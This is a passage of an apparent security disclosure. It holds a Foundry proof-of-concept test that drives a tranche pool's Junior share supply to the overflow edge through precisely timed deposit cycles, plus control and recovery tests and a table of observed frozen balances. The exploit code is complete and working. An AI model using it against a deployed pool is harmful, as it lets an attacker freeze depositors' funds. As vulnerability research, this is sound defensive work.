            uint256 due = _coupon(sp, t - ckpt);
            if (due < jp && jp - due <= START_JUNIOR_CEILING) {
                vm.warp(t);
                (, startJunior) = pool.getPendingDepositTrancheState();
                assertEq(startJunior, jp - due, "coupon model matches the pool preview");
                emit log_named_uint("idle weeks without trading revenue", k);
                return startJunior;
            }
        }
        revert("no start week");
    }

    /// @dev Off-chain planning (pure arithmetic on public state): pick deposit A so that a deposit B one epoch later
    ///      lands (supply + 1000) exactly on a power of two.
    function _planTuning() internal returns (Tuning memory p) {
        uint256 sp = pool.seniorPrincipal();
        uint256 jp = pool.juniorPrincipal();
        uint256 ckpt = pool.lastSeniorCouponCheckpointTime();
        p.tA = _requestEpochAt(block.timestamp) * EPOCH;
        assertTrue(_isOpenUtc(p.tA), "A in market hours");
        uint256 cA = _coupon(sp, p.tA - ckpt);
        p.qA = jp - cA + 1;
        uint256 spA = sp + cA;
        p.tB = _requestEpochAt(p.tA) * EPOCH;
        assertTrue(_isOpenUtc(p.tB), "B in market hours");
        uint256 cAB = _coupon(spA, p.tB - p.tA);
        uint256 u0 = juniorVault.totalSupply() + VIRTUAL_SHARES;

        vm.pauseGasMetering();
        for (uint256 i; i < MAX_TUNE_ITERATIONS; ++i) {
            uint256 dA = MIN_DEPOSIT + i;
            uint256 uA = u0 + Math.mulDiv(dA, u0, p.qA);
            uint256 qB = p.qA + dA - cAB; // (P_A + dA) - coupon(A->B) + 1, with P_A = qA - 1
            uint256 b = Math.log2(uA) + 1;
            for (uint256 k; k < 2; ++k) {
                uint256 n = (uint256(1) << (b + k)) - uA;
                uint256 dB = Math.mulDiv(n, qB, uA, Math.Rounding.Ceil);
                if (dB >= MIN_DEPOSIT && Math.mulDiv(dB, uA, qB) == n) {
                    p.dA = dA;
                    p.uA = uA;
                    p.qB = qB;
                    p.dB = dB;
                    p.uB = uint256(1) << (b + k);
                    p.iterations = i + 1;
                    vm.resumeGasMetering();
                    return p;
                }
            }
        }
        vm.resumeGasMetering();
        revert("no tuning hit");
    }

    function _executeTuning(
        Tuning memory p
    ) internal {
        tuningRequestA = _attackerDeposit(p.dA);
        assertEq(tuningRequestA, p.tA / EPOCH, "A epoch");
        vm.warp(p.tA);
        (, uint256 previewA) = pool.getPendingDepositTrancheState();
        assertEq(previewA + 1, p.qA, "A pricing principal as planned");
        _attackerSettle();
        assertEq(juniorVault.totalSupply() + VIRTUAL_SHARES, p.uA, "A minted as planned");

        uint256 requestB = _attackerDeposit(p.dB);
        assertEq(requestB, p.tB / EPOCH, "B epoch");
        vm.warp(p.tB);
        (, uint256 previewB) = pool.getPendingDepositTrancheState();
        assertEq(previewB + 1, p.qB, "B pricing principal as planned");
        _attackerSettle();
        assertEq(juniorVault.totalSupply() + VIRTUAL_SHARES, p.uB, "B lands supply + 1000 on a power of two");
    }

    /// @dev Exact doubling cycles. Each cycle: settle at the latest market-open second at which the coupon has drained
    ///      Junior principal to P >= 1 (q = P + 1), with a deposit of (2^j - 1) * q requested beforehand.
    function _inflate(
        bool executeFinal
    ) internal returns (bool finalDone, uint256 cycleCount, uint256 headRedeemId) {
        while (true) {
            uint256 u = juniorVault.totalSupply() + VIRTUAL_SHARES;
            uint256 e = Math.log2(u);
            assertEq(uint256(1) << e, u, "supply + 1000 stays a power of two");
            uint256 r = 256 - e;

            uint256 sp = pool.seniorPrincipal();
            uint256 jp = pool.juniorPrincipal();
            uint256 ckpt = pool.lastSeniorCouponCheckpointTime();
            uint256 tMin = _openAtOrAfter(_requestEpochAt(block.timestamp) * EPOCH);
            uint256 t = _latestOpenAtOrBefore(_latestWithCouponAtMost(sp, ckpt, jp - 1));
            require(t >= tMin, "drain plan");
            uint256 q = jp - _coupon(sp, t - ckpt) + 1;
            uint256 j = _cycleExponent(sp + _coupon(sp, t - ckpt), t, q, r);

            if (j == r) {
                uint256 qmin = _qmin(r);
                if (q < qmin) {
                    t = _latestOpenAtOrBefore(_latestWithCouponAtMost(sp, ckpt, jp + 1 - qmin));
                    require(t >= tMin, "final plan");
                    q = jp - _coupon(sp, t - ckpt) + 1;
                }
                if (!executeFinal) {
                    // Control: same moment, same poison head, no final deposit.
                    vm.warp(t);
                    headRedeemId = _queueAttackerRedeemHead();
                    return (false, cycleCount, headRedeemId);
                }
            }

            uint256 d = ((uint256(1) << j) - 1) * q;
            uint256 requestId = _attackerDeposit(d);
            assertLe(pool.lpEpochStart(requestId), t, "deposit matured at the planned second");
            vm.warp(t);
            assertFalse(engine.isOracleFrozen(), "market open");
            (, uint256 preview) = pool.getPendingDepositTrancheState();
            assertEq(preview + 1, q, "pricing principal as planned");
            if (j == r) {
                headRedeemId = _queueAttackerRedeemHead();
            }
            _attackerSettle();
            ++cycleCount;
            emit log_named_uint("  cycle: exponent j", j);
            emit log_named_uint("  cycle: pricing principal P (atoms)", q - 1);
            if (j == r) {
                assertEq(juniorVault.totalSupply(), OVERFLOW_EDGE_SUPPLY, "final mint lands on 2^256 - 1000");
                return (true, cycleCount, headRedeemId);
            }
            assertEq(juniorVault.totalSupply() + VIRTUAL_SHARES, u << j, "exact 2^j multiplication");
        }
    }

    /// @dev Smallest j that (a) meets the 1 USDG minimum and (b) leaves enough principal to survive the coupon until
    ///      the next request epoch opens (P_next >= qmin of the remaining exponent). Capped at the remaining exponent.
    function _cycleExponent(
        uint256 spAfter,
        uint256 t,
        uint256 q,
        uint256 r
    ) internal pure returns (uint256 j) {
        uint256 tNext = _openAtOrAfter(_requestEpochAt(t) * EPOCH);
        uint256 couponNext = _coupon(spAfter, tNext - t);
        j = 1;
        while (((uint256(1) << j) - 1) * q < MIN_DEPOSIT) {
            ++j;
        }
        while (j < r) {
            if ((uint256(1) << j) * q >= couponNext + _qmin(r - j)) {
                break;
            }
            ++j;
        }
        if (j > r) {
            j = r;
        }
    }

    function _qmin(
        uint256 r
    ) internal pure returns (uint256 qmin) {
        if (r >= 255) {
            return 2;
        }
        qmin = Math.ceilDiv(MIN_DEPOSIT, (uint256(1) << r) - 1);
        if (qmin < 2) {
            qmin = 2;
        }
    }

    function _queueAttackerRedeemHead() internal returns (uint256 redeemId) {
        uint256 shares = juniorVault.claimableDepositShares(tuningRequestA, ATTACKER);
        assertGt(shares, 0, "attacker holds activated Junior shares");
        vm.prank(ATTACKER);
        redeemId = juniorVault.requestRedeemFromClaimableDeposit(tuningRequestA, shares, ATTACKER);
        assertGt(redeemId, block.timestamp / EPOCH, "poison head matures after the final activation");
    }

    function _attackerDeposit(
        uint256 amount
    ) internal returns (uint256 requestId) {
        attackerDeposited += amount;
        requestId = _requestDeposit(juniorVault, ATTACKER, amount);
    }

    function _attackerSettle() internal {
        vm.prank(ATTACKER);
        pool.settleLpEpoch(0, 0);
    }

    // ------------------------------------------------------------------ arithmetic / calendar helpers

    function _coupon(
        uint256 sp,
        uint256 elapsed
    ) internal pure returns (uint256) {
        return (sp * SENIOR_RATE_BPS * elapsed) / COUPON_DENOMINATOR;
    }

    /// @dev Latest timestamp at which coupon(sp, t - ckpt) <= m.
    function _latestWithCouponAtMost(
        uint256 sp,
        uint256 ckpt,
        uint256 m
    ) internal pure returns (uint256) {
        return ckpt + ((m + 1) * COUPON_DENOMINATOR - 1) / (sp * SENIOR_RATE_BPS);
    }

    function _requestEpochAt(
        uint256 t
    ) internal pure returns (uint256) {
        uint256 imminent = t / EPOCH + 1;
        return t < imminent * EPOCH - REQUEST_CUTOFF ? imminent : imminent + 1;
    }

    /// @dev Conservative FX session: Monday 00:00 UTC to Friday 19:59:59 UTC (the engine closes Friday 17:00 NY).
    function _isOpenUtc(
        uint256 t
    ) internal pure returns (bool) {
        uint256 day = (t / 1 days + 4) % 7; // 0 = Sunday
        if (day >= 1 && day <= 4) {
            return true;
        }
        return day == 5 && (t % 1 days) < 20 hours;
    }

    function _openAtOrAfter(
        uint256 t
    ) internal pure returns (uint256) {
        if (_isOpenUtc(t)) {
            return t;
        }
        uint256 day = (t / 1 days + 4) % 7;
        return t - (t % 1 days) + ((8 - day) % 7) * 1 days;
    }

    function _latestOpenAtOrBefore(
        uint256 t
    ) internal pure returns (uint256) {
        if (_isOpenUtc(t)) {
            return t;
        }
        uint256 day = (t / 1 days + 4) % 7;
        return t - (t % 1 days) - ((day + 2) % 7) * 1 days + 20 hours - 1;
    }

    // ------------------------------------------------------------------ LP helpers

    function _requestDeposit(
        TrancheVault vault,
        address lp,
        uint256 amount
    ) internal returns (uint256 requestId) {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), amount);
        requestId = vault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
    }

    function _claimDeposit(
        TrancheVault vault,
        address lp,
        uint256 requestId
    ) internal {
        uint256 claimable = vault.claimableDepositRequest(requestId, lp);
        assertGt(claimable, 0, "deposit not activated");
        vm.prank(lp);
        vault.claimDeposit(requestId, claimable, lp, lp);
    }

    function _logPool(
        string memory tag
    ) internal {
        _log(tag);
        emit log_named_decimal_uint("   Senior principal", pool.seniorPrincipal(), 6);
        emit log_named_decimal_uint("   Senior HWM", pool.seniorHighWaterMark(), 6);
        emit log_named_decimal_uint("   Junior principal", pool.juniorPrincipal(), 6);
        emit log_named_uint("   Junior supply", juniorVault.totalSupply());
    }

    function _log(
        string memory s
    ) internal {
        emit log(s);
    }

}
```

</details>

### Observed balances:

All five tests pass.

| Test | Observed result |
|---|---|
| `test_Attack_SupplyAtOverflowEdge_AllLpSettlementReverts` | Final Junior supply is `2^256 - 1000`; 30/30 daily settlements panic; 50,050,309.114802 USDG and 125,439.374363 USDG of Senior claims remain unfunded |
| `test_Control_StopBeforeEdge_SettlementWorks` | One multiplication short of the edge, the same flow settles and pays 50,050,309.189910 USDG |
| `test_Recovery_SeniorDustFollowUpRequest` | A one-share request in the next epoch allows the main victim to receive 50,050,313.921761 USDG after about two hours |
| `test_Recovery_SeventeenSeniorEpochs` | The work cap processes 16 Senior epochs and funds 50,049,062.663913 USDG after about 17 hours |
| `test_Recovery_ThirdPartyDustUnblocksQueue` | A later one-share request by another Senior holder allows the earlier victim to receive 50,050,313.921761 USDG after about one hour |

Key exploit-state values:

```text
Junior principal before tuning:       58,813.783834 USDG
Tuning deposit A:                           1.056534 USDG
Tuning deposit B:                     150,623.799042 USDG
Total attacker deposits:              175,753.566057 USDG
Attack duration:                              514 hours
Final Junior principal:                     4.819007 USDG
Final Junior supply: 115792089237316195423570985008687907853269984665640564039457584007913129638936
Frozen Senior principal:             50,175,749.745507 USDG
```
